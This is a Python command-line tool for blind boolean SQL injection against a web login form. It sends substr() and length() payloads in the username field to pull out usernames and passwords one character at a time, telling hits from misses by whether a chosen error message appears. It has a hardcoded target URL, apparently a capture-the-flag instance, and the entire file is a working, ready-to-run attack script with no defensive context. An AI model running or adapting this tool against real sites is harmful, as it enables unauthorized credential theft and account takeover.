import requests,string
import argparse
url= 'http://34.74.105.127/b7ed9a6d50/login'

chars= string.printable
arg_parser = argparse.ArgumentParser(description='SQL injnection, bruteforce password or enum users')
arg_parser.add_argument('-a','--action', help='Define the action to do ("users" or "password")\n "password" By default ', default='password', type=str)
arg_parser.add_argument('-u','--user', help='The user which we want to find the password, Use it with password action \n By default the user is empty', default='', type=str)
arg_parser.add_argument('-b','--bypass', help='The message to bypass, which appears when the request is wrong ', required=True, type=str)
arg_parser.add_argument('-l','--url', help='The url of the sqli', required=True, type=str)
args = vars(arg_parser.parse_args())


def GetPassLength(username):
  # if know the username
  if username != "":  
    sqli=username+"' and length(password) = %s #"
  # if not
  else:
    sqli="' Or length(password) = %s #"
  #brute force password length:
  for i in range(1,257):
    payload = {'username':sqli%i,'password':"randompassword"}
    r = requests.post(args['url'],data=payload)
    if args['bypass'] not in  r.text: # if we bypass the message error
            print("The password length is : %s" % i)
            break
  return i+1  # we add 1 for the range

def GetUserLength():
  sqli="' or length(username) = %s #"
  #brute force username length:
  for i in range(1,257):
    payload = {'username':sqli%i,'password':"randompassword"}
    r = requests.post(args['url'],data=payload)
    if args['bypass'] not in   r.text: # if we bypass the message error
       print("The username length is : %s" % i)
       break
  return i+1  # we add 1 for the range

def GetSQLPASS(username,i,c):
  # if know the username
  if username != "": 
    return username+"' and substr(password,%s,1) = '%s' -- -" % (i,c)
  else:
    return "' Or substr(password,%s,1) = '%s' -- -" % (i,c)

def GetSQLUSER(i,c):
  return "' Or substr(username,%s,1) = '%s' #" % (i,c)

if args['action'] == "users":
  username_len = GetUserLength()
  print('The username: ',end='',flush=True)
  for i in range(1,username_len):
    for c in chars:
      injection = GetSQLUSER(i,c)
      payload = {'username':injection,'password':"randompassword"}
      r = requests.post(args['url'],data=payload)
      if args['bypass'] not in r.text:
        print(c,end='',flush=True)
        break
else:
  pass_len = GetPassLength(args['user'])
  print('The password: ',end='',flush=True)
  for i in range(1,pass_len):
    for c in chars:
        injection = GetSQLPASS(args['user'],i,c)
        payload = {'username':injection,'password':"randompassword"}
        r = requests.post(args['url'],data=payload)
        if args['bypass'] not in  r.text:
          print(c,end='',flush=True)
          break
